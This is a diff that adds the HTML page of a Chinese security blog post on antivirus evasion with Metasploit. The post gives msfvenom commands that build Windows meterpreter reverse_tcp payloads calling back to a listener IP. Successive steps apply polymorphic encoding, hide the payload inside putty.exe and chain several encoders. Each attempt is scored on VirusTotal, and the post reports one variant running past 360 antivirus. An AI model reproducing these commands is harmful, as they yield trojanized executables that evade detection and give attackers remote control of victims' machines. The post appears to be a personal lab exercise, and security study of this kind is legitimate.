@@ -1,0 +1,66 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>免杀初探-msf自免杀 - Guko's Blog</title><meta name="description" content="0x01 环境目标机器：windows10杀毒软件: 360安全卫士、360杀毒、火绒在线查杀：VT0x02 原始payload目标机是windows 10这里用windows/meterperter/reverse_tcp生成payload1msfvenom -p windows/meterpre"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">免杀初探-msf自免杀</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">免杀初探-msf自免杀</h1><div class="post-meta">2020-03-12<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><h4 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h4><p>目标机器：windows10</p>
+<p>杀毒软件: 360安全卫士、360杀毒、火绒</p>
+<p>在线查杀：VT</p>
+<a id="more"></a>
+
+<h4 id="0x02-原始payload"><a href="#0x02-原始payload" class="headerlink" title="0x02 原始payload"></a>0x02 原始payload</h4><p>目标机是windows 10这里用<code>windows/meterperter/reverse_tcp</code>生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.197.207 LPORT=5555 -f exe -o pentest.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/12/免杀初探-msf自免杀/1.png" alt></p>
+<p>原始的可以看到几乎没用,全面封杀</p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/2.png" alt></p>
+<p>在<code>virustotal.com</code>查杀率为<code>58/72</code></p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/3.png" alt></p>
+<h4 id="0x03-msf自编码处理"><a href="#0x03-msf自编码处理" class="headerlink" title="0x03 msf自编码处理"></a>0x03 msf自编码处理</h4><p>使用<code>msfvenom --list encoders</code>查看所有编码器</p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/4.png" alt></p>
+<p>等级最高的是<code>cmd/powershell_base64</code>和<code>x86/shikata_ga_nai</code>这里选择<code>x86/shikata_ga_nai</code>生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.197.207 LPORT=5555 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15  -f exe -o pentest2.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/12/免杀初探-msf自免杀/5.png" alt></p>
+<p>依旧全面封杀</p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/6.png" alt></p>
+<p>在<code>virustotal.com</code>上查杀率为<code>56/71</code></p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/7.png" alt></p>
+<p>注：<code>x86/shikata_ga_nai</code>是多态的，每次生成的攻击载荷文件都不一样，有时生成的文件会被查杀，有时却不会</p>
+<h4 id="0x04-msf自捆绑"><a href="#0x04-msf自捆绑" class="headerlink" title="0x04 msf自捆绑"></a>0x04 msf自捆绑</h4><p>生成payload的时候可以使用捆绑功能，msfvenom的<code>-x</code>参数可以指定一个自定的可执行文件作为模版，将payload嵌入其中，如下使用<code>putty.exe</code>做测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333  -x putty.exe  -f exe -o payload3.exe</span><br></pre></td></tr></table></figure>
+
+<p>依旧全部封杀</p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/9.png" alt></p>
+<p>在<code>virustotal.com</code>上查杀率为<code>35/71</code></p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/10.png" alt></p>
+<p>注：可以选择微软的其他工具作为模版exe</p>
+<h4 id="0x05-msf自捆绑-编码"><a href="#0x05-msf自捆绑-编码" class="headerlink" title="0x05 msf自捆绑+编码"></a>0x05 msf自捆绑+编码</h4><p>下载putty.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/12/免杀初探-msf自免杀/11.png" alt></p>
+<p>生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.197.210 LPORT=5555 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o pentest4.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/12/免杀初探-msf自免杀/12.png" alt></p>
+<p>在测试机器中发现火绒报毒，360并未报毒</p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/13.png" alt></p>
+<p>关闭火绒后，执行payload发现360无异常，可正常上线</p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/15.png" alt></p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/14.png" alt></p>
+<p>注：<code>-i</code>参数可以修改编码次数，次数越多越可能免杀，且因为<code>x86/shikata_ga_nai</code>是多态的，如果出现不能免杀360的情况下可多尝试几次</p>
+<p>在<code>virustotal.com</code>上查杀率为<code>44/71</code></p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/16.png" alt></p>
+<h4 id="0x05-msf多重编码"><a href="#0x05-msf多重编码" class="headerlink" title="0x05 msf多重编码"></a>0x05 msf多重编码</h4><p>如上我们了解到msfvenom的encoder编码器可以做一定程度的免杀，同样可以利用msfvenom多重编码功能，通过管道，让msfvenom的不同编码器反复编码进行混淆</p>
+<p>生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.197.210 LPORT=5555 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; pentest5.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/12/免杀初探-msf自免杀/17.png" alt></p>
+<p>在<code>virustotal.com</code>上查杀率为<code>49/71</code></p>
+<p><img src="/2020/03/12/免杀初探-msf自免杀/18.png" alt></p>
+<p>虽然查杀率变高了，依旧可以过一会儿360</p>
+</div><!--文章标签--><div class="tags"><a href="/tags/免杀/">免杀</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 18px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 15px;">远程代码执行</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/免杀/" style="font-size: 15px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/免杀初探-msf自免杀/">免杀初探-msf自免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/07/免杀初探/">免杀初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/06/利用msfvenom生成木马/">利用msfvenom生成木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/05/搭建域环境/">搭建域环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/03/Ngrok-MSF/">Ngrok&MSF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/28/Virt-Manager制作并克隆QCOW2镜像/">Virt-Manager制作并克隆QCOW2镜像</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/24/Tomcat-Ajp漏洞复现-CVE-2020-1938/">Tomcat_Ajp漏洞复现(CVE-2020-1938)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/18/metasploit之meterpreter/">metasploit之meterpreter</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/14/Metasploit基本使用和控制台命令/">Metasploit基本使用和控制台命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/13/Metasploit信息收集/">Metasploit信息收集</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+  if($(".highlight").length != 0){
+    var pc_width = $(".post-content").width();
+    $(".highlight .code").find("pre").width((pc_width-70)+"px");
+  }
+}
+window.onresize = function(){
+  auto_code_fit();
+}
+auto_code_fit();</script></div></body>
